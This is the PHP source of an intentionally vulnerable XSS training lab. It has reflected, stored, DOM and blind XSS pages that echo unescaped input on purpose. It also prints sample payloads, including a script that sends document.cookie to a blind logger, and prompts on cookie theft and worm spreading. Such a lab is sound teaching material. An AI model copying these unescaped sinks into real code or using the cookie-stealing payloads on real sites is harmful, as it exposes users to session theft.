<?php
// index.php - XSS teaching lab (single-file router)
require_once __DIR__ . '/init_db.php';
$dbfile = __DIR__ . '/db.sqlite';
$db = new PDO('sqlite:' . $dbfile);
$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

$page = $_GET['page'] ?? 'home';

// server-side basic filter levels for the Filter Lab
function filter_input_level($input, $level){
    if ($level === 'none') return $input;
    if ($level === 'naive') {
        // naive strip of <script> tags and common event handlers
        $out = preg_replace('#<\s*script[^>]*>(.*?)<\s*/\s*script>#is','',$input);
        $out = preg_replace('#on[a-z]+\s*=\s*["\'].*?["\']#is','',$out);
        return $out;
    }
    if ($level === 'strip_tags') {
        return strip_tags($input);
    }
    if ($level === 'encode') {
        return htmlspecialchars($input, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
    }
    if ($level === 'regex') {
        // remove <, > and javascript: pseudo-protocol occurrences
        $out = preg_replace('/<|>|javascript:/i','',$input);
        return $out;
    }
    // default fallback
    return $input;
}

// helper for rendering header
function header_html($title='XSS Lab', $active='home'){
    echo '<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>'.htmlspecialchars($title).'</title>';
    echo '<link rel="stylesheet" href="styles.css">';
    echo '</head><body>';
    echo '<div class="container">';
    // sidebar
    echo '<div class="sidebar card">';
    echo '<div class="logo">The XSS Rat — XSS Lab</div>';
    echo '<div class="sidebar-intro small">Pick a track to explore a specific XSS vector. Each lab walks you through reconnaissance, exploitation and reflection steps.</div>';
    $tabs = [
        'home'=>'Home overview',
        'fundamentals'=>'Foundations & concepts',
        'reflected'=>'Reflected XSS',
        'stored'=>'Stored XSS',
        'dom'=>'DOM XSS',
        'blind'=>'Blind XSS',
        'filter'=>'Filter lab',
        'contexts'=>'Contexts explorer',
        'playground'=>'Practice playground',
        'bypasses'=>'Bypass library'
    ];
    foreach ($tabs as $k=>$v){
        $classes = 'nav-item button';
        if ($k === $active) {
            $classes .= ' is-active';
        }
        echo '<div><a class="'.$classes.'" href="#" data-page="'.htmlspecialchars($k).'">'.htmlspecialchars($v).'</a></div>';
    }
    echo '<div class="small" style="margin-top:12px">Warning: intentionally vulnerable. Run locally.</div>';
    echo '</div>'; // sidebar end
    echo '<div>'; // main
    echo '<div class="card">';
    echo '<div class="lab-title">'.htmlspecialchars($title).'</div>';
}

// footer
function footer_html(){
    echo '</div>'; // card
    echo '</div>'; // main
    echo '</div>'; // container
    echo '<script src="app.js"></script>';
    echo '</body></html>';
}

// ROUTES
if ($page === 'home'){
    header_html('Home — XSS Lab', 'home');
    echo '<div class="hero">';
    echo '<div class="hero-title">Start from zero knowledge and grow into an XSS practitioner.</div>';
    echo '<div class="hero-body small">Follow the learning path: absorb the web fundamentals, practise every XSS flavour with checklists, then solidify your skills inside the sandbox playground.</div>';
    echo '</div>';
    echo '<div class="meta meta-columns intro-columns">';
    echo '<div><strong>What you will learn</strong><div class="small">Understand how browsers build the Document Object Model (DOM), how HTML tags and attributes shape a page, and how JavaScript interacts with those nodes. Each lab references these ideas so you can connect theory with the exploit workflow.</div></div>';
    echo '<div><strong>Suggested learning order</strong><ol class="lab-steps"><li>Foundations &amp; concepts</li><li>Reflected, stored and DOM XSS labs</li><li>Filter lab + Contexts explorer</li><li>Playground scenarios and custom experiments</li></ol></div>';
    echo '<div><strong>Practice mindset</strong><div class="small">Treat every section like an assessment: take notes, sketch payload variants, and capture lessons learned in your notebook so you leave ready to reproduce the attacks elsewhere.</div></div>';
    echo '</div>';
    echo '<div class="lab-grid">';
    $cards = [
        ['fundamentals','Foundations &amp; concepts','Build the mental model for HTML, the DOM and JavaScript before touching payloads.'],
        ['reflected','Reflected XSS','Spot input parameters that echo immediately and craft payloads that execute on first load.'],
        ['stored','Stored XSS','Persist malicious markup inside databases or comments and watch it execute for every visitor.'],
        ['dom','DOM XSS','Manipulate client-side JavaScript sinks such as <code>innerHTML</code> and URL fragments.'],
        ['blind','Blind XSS','Plant payloads that phone home to the blind logger to prove execution in remote panels.'],
        ['filter','Filter Lab','Experiment with increasingly strict server-side filters and learn reliable bypasses.'],
        ['contexts','Contexts','See how the same payload behaves in HTML, attributes, JS, CSS and URL contexts.'],
        ['playground','Playground','Apply everything you learned across multiple realistic mini applications.'],
        ['bypasses','Bypasses','Browse a curated list of payloads ranked from beginner friendly to advanced evasions.'],
    ];
    foreach ($cards as $card){
        echo '<a class="lab-card" href="#" data-page="'.htmlspecialchars($card[0]).'"><div class="lab-card-title">'.htmlspecialchars($card[1]).'</div><div class="lab-card-body small">'.$card[2].'</div><div class="lab-card-action">Start lab →</div></a>';
    }
    echo '</div>';
    echo '<div class="meta meta-columns">';
    echo '<div><strong>How to use these labs</strong><ol class="lab-steps"><li>Read the scenario to understand the application behaviour.</li><li>Use the checklist to experiment and note the results.</li><li>Capture payloads that work so you can reuse them later.</li><li>Reflect on how filters and contexts influenced the payload.</li></ol></div>';
    echo '<div><strong>Recommended toolkit</strong><ul class="lab-list"><li>Browser devtools (Elements + Console + Network)</li><li>Interception proxy (Burp, OWASP ZAP)</li><li>Custom payload scratchpad or local text editor</li><li>Notes on HTML tags, JS APIs and DOM properties you discover</li></ul></div>';
    echo '</div>';
    footer_html();
    exit;
}

if ($page === 'fundamentals'){
    header_html('Foundations & concepts', 'fundamentals');
    echo '<div class="section"><div class="section-title">Welcome to the web stack</div><div class="small">Before throwing payloads at inputs, understand how browsers interpret HTML, build the Document Object Model (DOM) and execute JavaScript. This foundation lets you reason about where user-controlled data travels.</div></div>';
    echo '<div class="section"><div class="section-title">HTML: the structure layer</div><div class="small">HyperText Markup Language describes the layout of a page using nested tags. Each tag can carry attributes that store extra data. Browsers parse these tags into DOM nodes.</div></div>';
    echo '<div class="meta meta-columns">';
    echo '<div><strong>HTML essentials</strong><ul class="lab-list"><li><code>&lt;tag&gt;content&lt;/tag&gt;</code> wraps text or other elements.</li><li>Attributes like <code>href="..."</code> or <code>onclick="..."</code> live inside the opening tag.</li><li>Void elements (e.g. <code>&lt;img&gt;</code>) have no closing tag and are common XSS sinks via attributes.</li></ul></div>';
    echo '<div><strong>Example document outline</strong><div class="bypass-list">&lt;!doctype html&gt;\n&lt;html&gt;\n  &lt;head&gt;... metadata ...&lt;/head&gt;\n  &lt;body&gt;\n    &lt;h1&gt;Title&lt;/h1&gt;\n    &lt;a href="/profile?id=7"&gt;Profile&lt;/a&gt;\n  &lt;/body&gt;\n&lt;/html&gt;</div></div>';
    echo '<div><strong>Why attackers care</strong><div class="small">If you can inject HTML, you can add new tags or attributes. That may give you a place to execute JavaScript (via <code>&lt;script&gt;</code>, event handlers, or dangerous URLs).</div></div>';
    echo '</div>';
    echo '<div class="section"><div class="section-title">The DOM: live objects representing the page</div><div class="small">When a browser parses HTML it creates a tree of nodes. JavaScript APIs manipulate this tree. Understanding node properties helps you predict where injected strings will land.</div></div>';
    echo '<div class="meta meta-columns">';
    echo '<div><strong>Key DOM terms</strong><ul class="lab-list"><li><em>Element nodes</em>: correspond to HTML tags and expose properties like <code>innerHTML</code> and <code>attributes</code>.</li><li><em>Text nodes</em>: represent literal text between tags.</li><li><em>Events</em>: actions like <code>click</code> or <code>load</code> that trigger handlers attached to nodes.</li></ul></div>';
    echo '<div><strong>Inspecting the DOM</strong><div class="small">Open browser devtools → Elements tab. Hover over nodes to see their relationships. Right-click to edit HTML live and observe how the DOM updates instantly.</div><div class="callout">Challenge: change a button label by editing <code>innerText</code> in the console.</div></div>';
    echo '<div><strong>DOM sinks that matter</strong><ul class="lab-list"><li><code>innerHTML</code> and <code>outerHTML</code> interpret strings as HTML.</li><li><code>document.write()</code> injects raw markup during page load.</li><li>Setting <code>href</code>, <code>src</code> or <code>data-*</code> attributes can trigger navigation or fetches.</li></ul></div>';
    echo '</div>';
    echo '<div class="section"><div class="section-title">JavaScript: behaviour layer</div><div class="small">Scripts run after the DOM exists (or as it loads) and can read, modify or execute strings. XSS aims to control this execution path.</div></div>';
    echo '<div class="meta meta-columns">';
    echo '<div><strong>Quick JavaScript primer</strong><ul class="lab-list"><li>Variables store data: <code>const payload = location.search;</code></li><li>Functions encapsulate behaviour: <code>function show(msg) { alert(msg); }</code></li><li>The DOM API is available via <code>document</code> and <code>window</code>.</li></ul></div>';
    echo '<div><strong>Common vulnerable patterns</strong><div class="bypass-list">// Taking user input\nconst hash = location.hash.substring(1);\n// Writing it without escaping\ndocument.getElementById("content").innerHTML = decodeURIComponent(hash);</div><div class="small">Any user can control <code>location.hash</code> by editing the URL, so the resulting HTML executes.</div></div>';
    echo '<div><strong>Essential browser APIs</strong><ul class="lab-list"><li><code>alert()</code> for proof-of-concept.</li><li><code>fetch()</code> or <code>XMLHttpRequest</code> for exfiltration.</li><li><code>localStorage</code>, <code>document.cookie</code> to read stored secrets.</li></ul></div>';
    echo '</div>';
    echo '<div class="section"><div class="section-title">Linking concepts to the labs</div><div class="small">With these basics you can reason about the attack surface: identify where HTML is generated, which DOM sinks are in play, and how JavaScript might execute injected data. Move on to the Reflected XSS lab and deliberately trace each step from input to sink.</div></div>';
    echo '<div class="meta"><strong>Next steps</strong><ol class="lab-steps"><li>Use the Reflected XSS lab to practice following a value from request → response → DOM.</li><li>Repeat for Stored XSS and note the persistence layer.</li><li>Revisit this page whenever a concept feels fuzzy—treat it like your personal glossary.</li></ol></div>';
    footer_html();
    exit;
}

if ($page === 'reflected'){
    header_html('Reflected XSS', 'reflected');
    echo '<div class="section"><div class="section-title">Mission brief</div><div class="small">Classic reflected XSS happens when user input is immediately returned in the HTTP response. Use the form below to trace the data flow and capture a working payload.</div></div>';
    echo '<div class="section"><div class="section-title">Checklist</div><ol class="lab-steps"><li>Map the reflected parameter using ?page=reflected&amp;q=test and observe the response.</li><li>Confirm raw HTML injection by attempting harmless tags like <code>&lt;em&gt;</code>.</li><li>Escalate to JavaScript execution with <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> or event handler payloads.</li><li>Experiment with filter bypasses such as breaking out of attributes or using <code>&lt;img src onerror=alert(1)&gt;</code>.</ol></div>';
    // echo back GET param 'q' unsafely
    $q = $_GET['q'] ?? '';
    echo '<form method="GET" action="?"><input type="hidden" name="page" value="reflected">';
    echo '<div class="form-row"><input class="input" name="q" data-field="q" placeholder="Enter text to reflect"><span class="input-hint">Tip: start simple, then move to payloads.</span></div>';
    echo '<div class="form-row"><button class="button">Submit &amp; observe response</button></div>';
    echo '</form>';
    echo '<div class="meta"><div class="meta-item" data-field="q"><strong>Reflected input</strong><div class="small">The value of <code>q</code> is injected directly into the DOM without encoding. Any HTML/JS you submit will render immediately.</div><div class="callout">Track the request in your proxy to practice identifying vulnerable parameters in the wild.</div></div></div>';
    echo '<div class="results"><div class="results-title">Raw response fragment</div><div class="results-body">';
    // intentionally vulnerable echo
    echo $q;
    echo '</div></div>';
    footer_html();
    exit;
}

if ($page === 'stored'){
    header_html('Stored XSS', 'stored');
    echo '<div class="section"><div class="section-title">Mission brief</div><div class="small">Stored (persistent) XSS abuses server-side storage such as databases or comment systems. Inputs are saved and replayed to all viewers without sanitisation.</div></div>';
    echo '<div class="section"><div class="section-title">Checklist</div><ol class="lab-steps"><li>Publish a benign message and verify it appears below.</li><li>Inject HTML to validate that markup is preserved in storage.</li><li>Store a script payload so it runs when the page renders.</li><li>Refine your payload to steal cookies or demonstrate impact via the console.</li></ol></div>';
    // handle posting messages into sqlite
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['title'])){
        $st = $db->prepare('INSERT INTO stored_messages (title, body) VALUES (:t,:b)');
        $st->execute([':t'=>$_POST['title'], ':b'=>$_POST['body']]);
        echo '<div class="notice success">Entry stored! Scroll down to see it render unsafely.</div>';
    }
    echo '<form method="POST" action="?page=stored">';
    echo '<div class="form-row"><input class="input" name="title" data-field="title" placeholder="Message title"><span class="input-hint">Example: Friendly greeting</span></div>';
    echo '<div class="form-row"><textarea class="input" name="body" data-field="body" placeholder="Message body (try XSS payloads)" rows="4"></textarea><span class="input-hint">Payload idea: &lt;script&gt;alert(document.cookie)&lt;/script&gt;</span></div>';
    echo '<div class="form-row"><button class="button">Save message</button></div>';
    echo '</form>';
    echo '<div class="meta"><div class="meta-item" data-field="body"><strong>Stored messages</strong><div class="small">Messages are stored in SQLite and printed back without sanitisation. Anyone viewing this list will execute your payload.</div><div class="callout">Try automating with curl to simulate a worm dropping multiple entries.</div></div></div>';
    echo '<div class="results">';
    $rows = $db->query('SELECT id,title,body,created_at FROM stored_messages ORDER BY id DESC LIMIT 30')->fetchAll(PDO::FETCH_ASSOC);
    foreach ($rows as $r){
        echo '<div style="border-bottom:1px solid rgba(255,255,255,0.02);padding:8px;margin-bottom:8px">';
        echo '<div class="small">#'.intval($r['id']).' - '.htmlspecialchars($r['created_at']).' - <strong>'.htmlspecialchars($r['title']).'</strong></div>';
        // UNSAFE: render body raw to demonstrate XSS
        echo '<div style="margin-top:6px">'. $r['body'] .'</div>';
        echo '</div>';
    }
    echo '</div>';
    footer_html();
    exit;
}

if ($page === 'dom'){
    header_html('DOM XSS', 'dom');
    // example using location.hash insertion into innerHTML
    echo '<div class="section"><div class="section-title">Mission brief</div><div class="small">DOM-based XSS executes entirely in the browser when JavaScript reads untrusted data and writes it to a sink without sanitising.</div></div>';
    echo '<div class="section"><div class="section-title">Checklist</div><ol class="lab-steps"><li>Review the inline script to identify the sink (<code>innerHTML</code>).</li><li>Modify the hash using the control below or straight in the URL bar.</li><li>Observe how the sink renders decoded content from <code>location.hash</code>.</li><li>Deliver payloads such as <code>#%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E</code> and watch them fire.</li></ol></div>';
    echo '<div class="form-row"><input class="input" id="dom-input" data-field="dom-input" placeholder="Change the URL hash or try a payload"><span class="input-hint">Hint: hashes are URL encoded. Use %3C for &lt;.</span></div>';
    echo '<div class="form-row"><button class="button" onclick="location.hash = document.getElementById(\'dom-input\').value">Set hash</button></div>';
    echo '<div class="meta"><div class="meta-item" data-field="dom-input"><strong>DOM sink</strong><div class="small">The script listens to <code>hashchange</code> and writes the decoded hash straight into <code>innerHTML</code>.</div><div class="callout">Open DevTools → Sources to inspect the live JavaScript as you test payloads.</div></div></div>';
    echo '<div class="results"><div class="results-title">Rendered hash content</div><div id="dom-sink" class="results-body">Hash will be shown here</div></div>';
    echo '<script>
(function(){
  var el = document.getElementById("dom-sink");
  // intentionally unsafe: writes location.hash into innerHTML
  function render(){ el.innerHTML = location.hash ? decodeURIComponent(location.hash.substring(1)) : "(no hash)"; }
  window.addEventListener("hashchange", render);
  render();
})();
</script>';
    footer_html();
    exit;
}

if ($page === 'blind'){
    header_html('Blind XSS', 'blind');
    echo '<div class="section"><div class="section-title">Mission brief</div><div class="small">Blind XSS payloads execute on a separate system (e.g. admin panel) and cannot be observed directly. Instead, the payload must exfiltrate to a controlled endpoint like the logger below.</div></div>';
    echo '<div class="section"><div class="section-title">Checklist</div><ol class="lab-steps"><li>Craft a payload that makes an outbound request to <code>/blind_logger.php</code>.</li><li>Deliver the payload to a hypothetical support system or admin portal.</li><li>Monitor the log to confirm when an unsuspecting victim loads it.</li><li>Extract contextual data (cookies, DOM, CSRF tokens) in the payload and send them to the logger.</li></ol></div>';
    echo '<form method="GET" action="?page=blind"><div class="form-row"><input class="input" name="payload" data-field="payload" placeholder="Example: &lt;img src=\'/blind_logger.php?p=1\'&gt;"><span class="input-hint">Try using fetch or new Image() for stealth.</span></div><div class="form-row"><button class="button">Preview payload</button></div></form>';
    $payload = $_GET['payload'] ?? '';
    if ($payload){
        echo '<div class="meta"><strong>Payload</strong><div class="small">Use this payload on the target application. When executed, it will call back to the logger below.</div><div class="callout">Shareable payload idea: <code>&lt;script&gt;new Image().src="/blind_logger.php?p="+encodeURIComponent(document.cookie)&lt;/script&gt;</code></div></div>';
        echo '<div class="results"><div class="results-title">Payload preview</div><div class="bypass-list">'.htmlspecialchars($payload).'</div></div>';
    }
    echo '<div style="margin-top:12px" class="card"><div class="section-title">Recent blind hits</div><div class="small">Each entry represents an HTTP request made by a victim’s browser when your payload executed.</div>';
    $rows = $db->query('SELECT id,created_at,remote_addr,user_agent,params FROM blind_hits ORDER BY id DESC LIMIT 30')->fetchAll(PDO::FETCH_ASSOC);
    foreach ($rows as $r){
        echo '<div style="border-top:1px solid rgba(255,255,255,0.02);padding:8px;margin-top:8px"><div class="small">#'.intval($r['id']).' '.htmlspecialchars($r['created_at']).' from '.htmlspecialchars($r['remote_addr']).'</div>';
        echo '<div class="small">UA: '.htmlspecialchars($r['user_agent']).'</div>';
        echo '<div class="bypass-list">'.htmlspecialchars($r['params']).'</div></div>';
    }
    echo '</div>';
    footer_html();
    exit;
}

if ($page === 'filter'){
    header_html('Filter Lab', 'filter');
    echo '<div class="section"><div class="section-title">Mission brief</div><div class="small">Use the filter lab to understand how different server-side defences behave. Submit payloads and compare the raw, filtered and rendered output.</div></div>';
    echo '<div class="section"><div class="section-title">Checklist</div><ol class="lab-steps"><li>Select a filter level to see how it transforms your input.</li><li>Test known payloads from the bypass library against each level.</li><li>Document which encodings or transformations defeat the filter.</li><li>Consider the impact if the filtered output is placed into various contexts.</li></ol></div>';
    $level = $_GET['level'] ?? 'none';
    $input = $_POST['input'] ?? null;
    echo '<form method="POST" action="?page=filter&level='.urlencode($level).'">';
    echo '<div class="form-row"><label class="small">Filter level:</label><select name="level_select" onchange="this.form.submit()"><option value="none" '.($level==='none'?'selected':'').'>none (vulnerable)</option><option value="naive" '.($level==='naive'?'selected':'').'>naive (strip &lt;script&gt; and on* handlers)</option><option value="strip_tags" '.($level==='strip_tags'?'selected':'').'>strip_tags()</option><option value="regex" '.($level==='regex'?'selected':'').'>regex (remove &lt; &gt; and javascript:)</option><option value="encode" '.($level==='encode'?'selected':'').'>encode (htmlspecialchars)</option></select><span class="input-hint">Changes auto-submit so you can compare levels quickly.</span></div>';
    echo '</form>';
    // accept input and show before/after and render result sink
    echo '<form method="POST" action="?page=filter&level='.urlencode($level).'"><div class="form-row"><textarea class="input" name="input" data-field="filter-input" rows="4" placeholder="Try payloads here"></textarea><span class="input-hint">Try: &lt;svg onload=alert(1)&gt;</span></div><div class="form-row"><button class="button">Run through filter</button></div></form>';
    if ($_SERVER['REQUEST_METHOD']==='POST' && isset($_POST['input'])){
        $lvl = $_GET['level'] ?? 'none';
        // respect selection change via form that set level_select
        if (!empty($_POST['level_select'])) $lvl = $_POST['level_select'];
        $raw = $_POST['input'];
        $filtered = filter_input_level($raw, $lvl);
        echo '<div class="meta"><strong>Server-side filter applied:</strong> '.htmlspecialchars($lvl).'<div class="callout">Does the filtered result still execute? Use the rendered sink to confirm.</div></div>';
        echo '<div class="results"><div class="results-title">Analysis</div><div class="analysis-grid">';
        echo '<div><div class="analysis-label">Raw input</div><div class="bypass-list">'.htmlspecialchars($raw).'</div></div>';
        echo '<div><div class="analysis-label">Filtered output</div><div class="bypass-list">'.htmlspecialchars($filtered).'</div></div>';
        echo '</div>';
        echo '<div class="results-sink"><div class="analysis-label">Rendered sink (unsafe)</div><div class="sink-output">';
        // intentionally render filtered output without encoding to show bypasses
        echo $filtered;
        echo '</div></div></div>';
    }
    footer_html();
    exit;
}

if ($page === 'playground'){
    header_html('Practice playground', 'playground');
    echo '<div class="section"><div class="section-title">Put the concepts to work</div><div class="small">Use these miniature applications to rehearse exploitation outside of the guided steps. Each scenario mirrors a real bug class and encourages you to apply reconnaissance, payload crafting and impact demonstration.</div></div>';
    echo '<div class="section"><div class="section-title">How to approach the playground</div><ol class="lab-steps"><li>Skim the brief and predict where user input will land.</li><li>Attempt benign probes (<code>test</code>, <code>&lt;em&gt;</code>, quotes) before escalating.</li><li>Record working payloads and why they succeed—think about DOM vs. server rendering.</li><li>Reset the page with different payload styles (HTML, attribute, URL) to cement the concept.</li></ol></div>';

    // Scenario 1: reflected search widget
    $reflect = $_GET['reflect'] ?? '';
    echo '<div class="card scenario">';
    echo '<div class="section-title">Scenario 1: Help centre search (reflected)</div>';
    echo '<div class="small">A support portal echoes the <code>q</code> parameter when no results are found. Demonstrate how reflected input leads to execution.</div>';
    echo '<form method="GET" action="?"><input type="hidden" name="page" value="playground"><div class="form-row"><input class="input" name="reflect" data-field="reflect" placeholder="Search query"><span class="input-hint">Start with plain text, then try markup like &lt;img src onerror=alert(1)&gt;</span></div><div class="form-row"><button class="button">Search</button></div></form>';
    echo '<div class="meta"><div class="meta-item" data-field="reflect"><strong>Investigation tips</strong><div class="small">View source after submitting. The query is injected inside a <code>&lt;div&gt;</code> without encoding, so HTML payloads execute immediately.</div></div></div>';
    echo '<div class="results"><div class="results-title">Search response</div><div class="results-body">';
    if ($reflect !== ''){
        echo 'No results for: '.$reflect; // intentionally unsafe
    } else {
        echo '(Submit a query to see the reflection)';
    }
    echo '</div></div>';
    echo '</div>';

    // Scenario 2: community comment wall (stored)
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_POST['scenario'] ?? '') === 'comment_wall'){
        $name = trim($_POST['name'] ?? '');
        $message = $_POST['message'] ?? '';
        $payload = json_encode(['name'=>$name,'message'=>$message], JSON_UNESCAPED_UNICODE);
        $stmt = $db->prepare('INSERT INTO playground_entries (scenario, content) VALUES (:scenario, :content)');
        $stmt->execute([':scenario'=>'comment_wall', ':content'=>$payload]);
        echo '<div class="notice success">Comment saved to the wall. Reload the page to observe stored execution.</div>';
    }
    $commentStmt = $db->prepare('SELECT id, created_at, content FROM playground_entries WHERE scenario = :scenario ORDER BY id DESC LIMIT 25');
    $commentStmt->execute([':scenario'=>'comment_wall']);
    $commentRows = $commentStmt->fetchAll(PDO::FETCH_ASSOC);
    echo '<div class="card scenario">';
    echo '<div class="section-title">Scenario 2: Community shoutbox (stored)</div>';
    echo '<div class="small">Messages persist in the database and display for every visitor. Abuse the body field to deliver a self-firing payload.</div>';
    echo '<form method="POST" action="?page=playground"><input type="hidden" name="scenario" value="comment_wall"><div class="form-row"><input class="input" name="name" data-field="pg-name" placeholder="Display name"><span class="input-hint">Your name is encoded safely.</span></div><div class="form-row"><textarea class="input" name="message" data-field="pg-message" rows="3" placeholder="Message (HTML allowed)"></textarea><span class="input-hint">Stored payload idea: &lt;script&gt;alert(\'stored\')&lt;/script&gt;</span></div><div class="form-row"><button class="button">Post message</button></div></form>';
    echo '<div class="meta meta-columns"><div class="meta-item" data-field="pg-message"><strong>Recon questions</strong><ul class="lab-list"><li>Does the body render with <code>innerHTML</code> or server-side templating?</li><li>Can you craft a payload that steals another visitor&apos;s cookies?</li><li>What happens if you add an auto-submitting form to spread the worm?</li></ul></div><div><strong>Recent shoutbox entries</strong><div class="small">Everything below is rendered without sanitisation—perfect for verifying stored XSS.</div></div></div>';
    echo '<div class="results"><div class="results-title">Wall feed</div>';
    foreach ($commentRows as $row){
        $decoded = json_decode($row['content'], true);
        $name = htmlspecialchars($decoded['name'] ?? 'Anonymous');
        $message = $decoded['message'] ?? '';
        echo '<div class="wall-entry"><div class="small">#'.intval($row['id']).' • '.htmlspecialchars($row['created_at']).' • <strong>'.$name.'</strong></div><div class="wall-body">'.$message.'</div></div>';
    }
    if (count($commentRows) === 0){
        echo '<div class="small">No entries yet. Be the first to store something.</div>';
    }
    echo '</div>';
    echo '</div>';

    // Scenario 3: client-side personalization (DOM)
    echo '<div class="card scenario">';
    echo '<div class="section-title">Scenario 3: Personalised dashboard (DOM)</div>';
    echo '<div class="small">A dashboard stores your preferences in <code>localStorage</code> and uses them to build widgets with <code>innerHTML</code>. Tamper with the data to execute arbitrary scripts when the widget renders.</div>';
    echo '<div class="form-row"><input class="input" id="playground-widget" data-field="pg-dom" placeholder="Widget title or payload"><span class="input-hint">Tip: payloads should be URL encoded when modifying storage manually.</span></div>';
    echo '<div class="form-row"><button class="button" id="pg-save">Save preference</button><button class="button" id="pg-clear" style="background:rgba(255,255,255,0.1);color:#fff">Reset</button></div>';
    echo '<div class="meta"><div class="meta-item" data-field="pg-dom"><strong>Experiment ideas</strong><div class="small">Open DevTools → Application → Local Storage. Edit <code>dashboard_widget</code> to inject HTML such as <code>&lt;img src onerror=alert(document.domain)&gt;</code> then refresh the page.</div></div></div>';
    echo '<div class="results"><div class="results-title">Rendered widget</div><div id="pg-widget-output" class="results-body">(No widget stored yet)</div></div>';
    echo '<script>(function(){
        var input = document.getElementById("playground-widget");
        var output = document.getElementById("pg-widget-output");
        var saveBtn = document.getElementById("pg-save");
        var clearBtn = document.getElementById("pg-clear");
        function render(){
            var saved = localStorage.getItem("dashboard_widget");
            if (saved){
                output.innerHTML = decodeURIComponent(saved);
            } else {
                output.textContent = "(No widget stored yet)";
            }
        }
        saveBtn.addEventListener("click", function(e){
            e.preventDefault();
            localStorage.setItem("dashboard_widget", encodeURIComponent(input.value));
            render();
        });
        clearBtn.addEventListener("click", function(e){
            e.preventDefault();
            localStorage.removeItem("dashboard_widget");
            render();
        });
        render();
    })();</script>';
    echo '</div>';

    echo '<div class="meta"><strong>Wrap-up</strong><ol class="lab-steps"><li>Reset each scenario and attempt different payload styles (event handlers, <code>javascript:</code> URLs, SVG).</li><li>Document which defences are missing and how you would fix them.</li><li>Share successful payloads back in the bypass library so future you can reuse them.</li></ol></div>';
    footer_html();
    exit;
}

if ($page === 'contexts'){
    header_html('XSS Contexts Explorer', 'contexts');
    echo '<div class="section"><div class="section-title">Mission brief</div><div class="small">Payload behaviour changes depending on the surrounding context. Use this explorer to see how the same string behaves in multiple locations.</div></div>';
    echo '<div class="section"><div class="section-title">Checklist</div><ol class="lab-steps"><li>Input a payload that mixes quotes, tags and JavaScript.</li><li>Note which contexts render, escape or break on your payload.</li><li>Adjust encoding to target specific contexts (attribute vs. JS string etc.).</li><li>Record working variants for future engagements.</li></ol></div>';
    // contexts: html body, attribute, js string, url param, style
    echo '<form method="GET" action="?page=contexts">';
    echo '<div class="form-row"><input class="input" name="c" data-field="contexts-input" placeholder="Payload to test (e.g. \'\' onmouseover=alert(1) )"><span class="input-hint">Try combining quotes to break attributes and strings.</span></div>';
    echo '<div class="form-row"><button class="button">Test contexts</button></div>';
    echo '</form>';
    $c = $_GET['c'] ?? '';
    echo '<div class="context-grid">';
    echo '<div><div class="analysis-label">HTML body</div><div class="results">'. $c .'</div><div class="context-note small">Rendered with no encoding. Perfect for testing straight injections.</div></div>';
    echo '<div><div class="analysis-label">HTML attribute</div><div class="results"><div><button '.$c.'>Example button</button></div></div><div class="context-note small">Break out of the attribute with quotes or angle brackets.</div></div>';
    echo '<div><div class="analysis-label">JavaScript string</div><div class="results"><script>var s = "'.str_replace('"','\"',$c).'";console.log(s);</script><div class="small">(Check the console to confirm execution)</div></div><div class="context-note small">Escape double quotes with \" to stay inside the string.</div></div>';
    echo '<div><div class="analysis-label">URL / href</div><div class="results"><a href="'.htmlspecialchars($c).'">Click me (href)</a></div><div class="context-note small">Try javascript: payloads or protocol-relative URLs.</div></div>';
    echo '<div><div class="analysis-label">CSS</div><div class="results"><div style="width:100%;height:30px;'.htmlspecialchars($c).'">Box</div></div><div class="context-note small">Some browsers execute JavaScript via CSS expressions in legacy modes.</div></div>';
    echo '</div>';
    echo '</div>';
    footer_html();
    exit;
}

if ($page === 'bypasses'){
    header_html('Filter bypasses (examples increasing difficulty)', 'bypasses');
    // load bypass file
    $bf = __DIR__ . '/bypasses.txt';
    $content = is_file($bf) ? file_get_contents($bf) : 'No bypass file found.';
    echo '<div class="section"><div class="section-title">Mission brief</div><div class="small">A grab bag of payloads for when filters attempt to block scripts. Start with the basics then escalate to more obscure vectors.</div></div>';
    echo '<div class="section"><div class="section-title">How to practice</div><ol class="lab-steps"><li>Load a filter level in the Filter Lab.</li><li>Work down the list until one executes.</li><li>Note why it worked (protocol change, event handler, SVG, etc.).</li><li>Craft your own variant and append it to the list for future runs.</li></ol></div>';
    echo '<div class="results bypass-list" style="margin-top:10px">'.htmlspecialchars($content).'</div>';
    footer_html();
    exit;
}

// default fallback
header_html('Unknown', $page);
echo '<div class="small">Unknown page.</div>';
footer_html();
